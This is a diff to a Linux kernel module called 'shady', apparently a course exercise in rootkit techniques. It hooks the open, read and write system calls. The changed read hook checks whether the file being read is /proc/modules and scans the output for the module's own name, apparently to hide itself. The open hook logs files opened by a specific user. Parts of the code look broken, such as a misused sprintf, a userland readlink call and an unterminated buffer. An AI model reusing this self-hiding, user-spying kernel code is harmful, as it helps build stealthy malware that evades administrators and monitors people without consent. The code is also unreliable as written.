@@ -32,6 +32,7 @@
 //my includes
 #include <linux/cred.h>
 #include <linux/string.h>
+#include <linux/unistd.h>
 //end
 
 #include <asm/uaccess.h>
@@ -59,8 +60,6 @@ static struct class *shady_class = NULL;
 /* ================================================================ */
 
 //my variables
-int read_check_flag=0;
-
 asmlinkage int (*old_open) (const char*, int, int);
 asmlinkage ssize_t (*old_write) (int fd, const void *buf, size_t count);
 asmlinkage ssize_t (*old_read) (int fd, const void *buf, size_t count);
@@ -91,16 +90,17 @@ asmlinkage ssize_t my_write(int fd, const void *buf, size_t count)
 
 asmlinkage ssize_t my_read(int fd, const void *buf, size_t count)
 {
-     if(read_check_flag)
+     char nameBuffer[13];
+     char* filename = "/proc/modules";
+     int i;
+     int searchIndex = 0;
+     int searchLength = 5;
+     char searchText[] = "shady";
+     char readlinkPath[PATH_MAX];
+     sprintf(&readlinkPath, "/proc/self/fd/%d", fd);
+     readlink(readlinkPath, nameBuffer, 13);
+     if(!strcmp(filename, nameBuffer))
      {
-          char nameBuffer[13];
-          char* filename = "/proc/modules";
-          int i;
-          int searchIndex = 0;
-          int searchLength = 5;
-          char searchText[] = "shady";
-          //(*readlink_ptr)(const char *path, char *buf, size_t bufsiz) = ((unsigned long **)system_call_table_address)[__NR_readlink];
-          //readlink_ptr("")
           for(i=0; i<count; i++)
           {
                if(((char*)buf)[i]==searchText[searchIndex])
@@ -123,14 +123,9 @@ asmlinkage ssize_t my_read(int fd, const void *buf, size_t count)
 
 asmlinkage int my_open (const char* file, int flags, int mode)
 {
-     char* test = "/proc/modules";
      kuid_t marks_kuid;
      marks_kuid.val = marks_uid;
      /* YOUR CODE HERE */
-     if(!strcmp(file, test))
-     {
-          read_check_flag=1;
-     }
      if(uid_eq(get_current_cred()->uid, marks_kuid))
      {
           printk("mark is about to open \'%s\'\n", file);
